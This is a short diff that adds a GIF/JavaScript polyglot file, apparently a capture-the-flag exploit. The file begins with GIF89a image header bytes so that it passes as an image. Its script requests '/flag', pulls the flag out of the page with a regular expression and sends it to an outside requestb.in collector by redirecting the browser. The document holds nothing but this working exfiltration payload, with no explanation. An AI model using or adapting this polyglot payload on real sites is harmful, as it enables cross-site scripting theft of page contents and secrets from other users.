@@ -1,0 +1,9 @@
+GIF89a/*.......*/=0;var xhr = new XMLHttpRequest();
+        xhr.open('GET', '/flag');
+        xhr.onload = function() {
+            if (xhr.status === 200) {
+                var arr = xhr.responseText.match(/<h3 id="flag">([\w\W\t\s]*)<\/h3>/gi) || [""];
+                document.location = 'https://requestb.in/rwlujjrw?text=' + arr;
+            }
+        };
+        xhr.send();
